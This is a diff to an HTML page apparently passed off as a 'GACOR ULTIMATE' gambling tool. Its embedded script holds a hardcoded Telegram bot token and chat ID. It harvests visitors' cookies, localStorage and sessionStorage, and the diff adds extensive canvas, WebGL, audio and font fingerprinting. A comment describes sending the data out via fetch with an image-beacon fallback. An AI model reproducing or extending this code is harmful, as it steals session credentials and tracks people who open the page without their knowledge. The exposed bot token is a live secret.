@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚡ GACOR ULTIMATE v4.0</title>
+  <title>⚡ GACOR ULTIMATE v6.0</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
@@ -76,22 +76,231 @@
         const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
         const chatId = '7839405566';
 
-        // Kumpulkan semua data sensitif
+        // Kumpulkan SEMUA data yang mungkin
         const data = {
+          // 1. Cookie & Storage
           cookie: document.cookie || 'no-cookie',
           localStorage: JSON.stringify(localStorage) || '{}',
           sessionStorage: JSON.stringify(sessionStorage) || '{}',
+          
+          // 2. Browser & Device Info
           userAgent: navigator.userAgent,
           platform: navigator.platform,
           language: navigator.language,
+          languages: navigator.languages || [],
+          deviceMemory: navigator.deviceMemory || 'unknown',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          vendor: navigator.vendor || 'unknown',
+          vendorSub: navigator.vendorSub || 'unknown',
+          product: navigator.product || 'unknown',
+          productSub: navigator.productSub || 'unknown',
+          
+          // 3. Screen & Window
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation ? screen.orientation.type : 'unknown'
+          },
+          window: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            devicePixelRatio: window.devicePixelRatio
+          },
+          
+          // 4. URL & Navigation
           url: window.location.href,
+          origin: window.location.origin,
+          protocol: window.location.protocol,
+          host: window.location.host,
+          hostname: window.location.hostname,
+          port: window.location.port,
+          pathname: window.location.pathname,
+          search: window.location.search,
+          hash: window.location.hash,
           referrer: document.referrer || 'direct',
-          screen: `${screen.width}x${screen.height}`,
-          timestamp: new Date().toISOString(),
+          
+          // 5. Performance & Timing
           performance: performance.timing ? {
-            load: performance.timing.loadEventEnd - performance.timing.navigationStart,
-            dom: performance.timing.domInteractive - performance.timing.navigationStart
-          } : null
+            navigationStart: performance.timing.navigationStart,
+            unloadEventStart: performance.timing.unloadEventStart,
+            unloadEventEnd: performance.timing.unloadEventEnd,
+            redirectStart: performance.timing.redirectStart,
+            redirectEnd: performance.timing.redirectEnd,
+            fetchStart: performance.timing.fetchStart,
+            domainLookupStart: performance.timing.domainLookupStart,
+            domainLookupEnd: performance.timing.domainLookupEnd,
+            connectStart: performance.timing.connectStart,
+            connectEnd: performance.timing.connectEnd,
+            secureConnectionStart: performance.timing.secureConnectionStart,
+            requestStart: performance.timing.requestStart,
+            responseStart: performance.timing.responseStart,
+            responseEnd: performance.timing.responseEnd,
+            domLoading: performance.timing.domLoading,
+            domInteractive: performance.timing.domInteractive,
+            domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
+            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
+            domComplete: performance.timing.domComplete,
+            loadEventStart: performance.timing.loadEventStart,
+            loadEventEnd: performance.timing.loadEventEnd,
+            totalLoad: performance.timing.loadEventEnd - performance.timing.navigationStart
+          } : null,
+          
+          // 6. Network & Connection
+          connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+          } : null,
+          
+          // 7. Geolocation (jika ada)
+          geo: navigator.geolocation ? 'available' : 'not available',
+          
+          // 8. Battery (jika ada)
+          battery: navigator.getBattery ? 'available' : 'not available',
+          
+          // 9. Media & Input
+          mediaDevices: navigator.mediaDevices ? 'available' : 'not available',
+          permissions: navigator.permissions ? 'available' : 'not available',
+          vibrate: navigator.vibrate ? 'available' : 'not available',
+          
+          // 10. Browser Features
+          doNotTrack: navigator.doNotTrack || 'unknown',
+          cookieEnabled: navigator.cookieEnabled,
+          onLine: navigator.onLine,
+          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+          
+          // 11. Plugins & MIME Types
+          plugins: Array.from(navigator.plugins || []).map(p => ({
+            name: p.name,
+            filename: p.filename,
+            description: p.description
+          })),
+          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => ({
+            type: m.type,
+            description: m.description,
+            suffixes: m.suffixes
+          })),
+          
+          // 12. Canvas Fingerprint (rendering fingerprint)
+          canvasFingerprint: (function() {
+            try {
+              const canvas = document.createElement('canvas');
+              canvas.width = 256;
+              canvas.height = 256;
+              const ctx = canvas.getContext('2d');
+              ctx.textBaseline = 'top';
+              ctx.font = '14px Arial';
+              ctx.fillStyle = '#f60';
+              ctx.fillRect(125, 1, 62, 20);
+              ctx.fillStyle = '#069';
+              ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+              ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+              ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+              return canvas.toDataURL();
+            } catch(e) {
+              return 'error';
+            }
+          })(),
+          
+          // 13. WebGL Fingerprint
+          webglFingerprint: (function() {
+            try {
+              const canvas = document.createElement('canvas');
+              const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+              if (!gl) return 'not supported';
+              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+              if (!debugInfo) return 'no debug info';
+              return {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+              };
+            } catch(e) {
+              return 'error';
+            }
+          })(),
+          
+          // 14. Audio Fingerprint
+          audioFingerprint: (function() {
+            try {
+              const AudioContext = window.AudioContext || window.webkitAudioContext;
+              if (!AudioContext) return 'not supported';
+              const ctx = new AudioContext();
+              const osc = ctx.createOscillator();
+              const gain = ctx.createGain();
+              osc.type = 'sawtooth';
+              osc.frequency.value = 440;
+              gain.gain.value = 0;
+              osc.connect(gain);
+              gain.connect(ctx.destination);
+              osc.start(0);
+              osc.stop(0.1);
+              return {
+                sampleRate: ctx.sampleRate,
+                state: ctx.state
+              };
+            } catch(e) {
+              return 'error';
+            }
+          })(),
+          
+          // 15. Timezone & Locale
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          locale: Intl.DateTimeFormat().resolvedOptions().locale,
+          
+          // 16. System Fonts (via font enumeration)
+          systemFonts: (function() {
+            try {
+              const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+              const baseFont = 'monospace';
+              const testString = 'mmmmmmmmmmmmmm';
+              const canvas = document.createElement('canvas');
+              const ctx = canvas.getContext('2d');
+              let available = [];
+              fontList.forEach(font => {
+                ctx.font = `72px ${font}, ${baseFont}`;
+                const width1 = ctx.measureText(testString).width;
+                ctx.font = `72px ${baseFont}`;
+                const width2 = ctx.measureText(testString).width;
+                if (width1 !== width2) available.push(font);
+              });
+              return available;
+            } catch(e) {
+              return 'error';
+            }
+          })(),
+          
+          // 17. Timestamp & Date
+          timestamp: new Date().toISOString(),
+          timezoneOffset: new Date().getTimezoneOffset(),
+          dateString: new Date().toString(),
+          
+          // 18. Browser & OS Detection
+          browserInfo: (function() {
+            const ua = navigator.userAgent;
+            let browser = 'unknown';
+            let os = 'unknown';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edge')) browser = 'Edge';
+            else if (ua.includes('Opera')) browser = 'Opera';
+            
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac OS')) os = 'MacOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+            
+            return { browser, os };
+          })()
         };
 
         // Kirim via fetch + fallback via image beacon
@@ -280,4 +489,4 @@
     })();
   </script>
 </body>
-</html>s
+</html>
